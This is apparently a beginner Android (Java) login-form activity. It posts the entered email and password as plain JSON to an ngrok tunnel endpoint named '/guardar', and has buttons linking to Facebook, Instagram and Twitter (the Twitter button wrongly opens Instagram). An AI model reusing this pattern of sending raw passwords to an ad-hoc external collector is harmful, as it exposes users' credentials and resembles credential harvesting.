package com.example.formlogin;


import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyLog;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.UnsupportedEncodingException;
import java.net.URI;

public class MainActivity extends AppCompatActivity {

    Button Enviar;
    private Button Btn_Facebook, Btn_Instagram, Btn_Twitter;
    String URL_F = "https://m.facebook.com/",
            URL_I = "https://www.instagram.com/",
             URL_T = "https://twitter.com/";


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Enviar = findViewById(R.id.Enviar);

        Enviar.setOnClickListener(view -> {

            EditText NombreEditText = findViewById(R.id.NombreEditText);
            EditText PasscodeEditText = findViewById(R.id.PasscodeEditText);

            RequestQueue queue = Volley.newRequestQueue(this);
            String url = "https://e30c-2800-484-8595-c702-94b0-e08d-dce5-d2cc.ngrok.io/guardar";

            JSONObject jsonBody = new JSONObject();

            try {
                jsonBody.put("email", NombreEditText.getText().toString());
                jsonBody.put("password", PasscodeEditText.getText().toString());
                jsonBody.put("nombre", "Prueba");
            } catch (JSONException e) {
                e.printStackTrace();
            }

            final String requestBody = jsonBody.toString();


            StringRequest stringRequest = new StringRequest(Request.Method.POST, url, response -> {
                Log.i("VOLLEY", response);
                Intent i = new Intent( MainActivity.this, MainActivity2.class);
                startActivity(i);
            }, error -> Log.e("VOLLEY", error.toString())) {
                @Override
                public String getBodyContentType() {
                    return "application/json; charset=utf-8";
                }

                @Override
                public byte[] getBody() throws AuthFailureError {
                    try {
                        return requestBody == null ? null : requestBody.getBytes("utf-8");
                    } catch (UnsupportedEncodingException uee) {
                        VolleyLog.wtf("Unsupported Encoding while trying to get the bytes of %s using %s", requestBody, "utf-8");
                        return null;
                    }
                }
            };

            queue.add(stringRequest);
        });

        Btn_Facebook = findViewById(R.id.Btn_Facebook);
        Btn_Facebook.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Uri _linkF = Uri.parse(URL_F);
                Intent i = new Intent(Intent.ACTION_VIEW,_linkF);
                startActivity(i);
                //Log.d("click","ok");
            }
        });

        Btn_Instagram = findViewById(R.id.Btn_Instagram);
        Btn_Instagram.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Uri _linkI = Uri.parse(URL_I);
                Intent i = new Intent(Intent.ACTION_VIEW,_linkI);
                startActivity(i);
                //Log.d("click","ok");
            }
        });

        Btn_Twitter = findViewById(R.id.Btn_Twitter);
        Btn_Twitter.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Uri _linkT = Uri.parse(URL_I);
                Intent i = new Intent(Intent.ACTION_VIEW,_linkT);
                startActivity(i);
                //Log.d("click","ok");
            }
        });
    }
}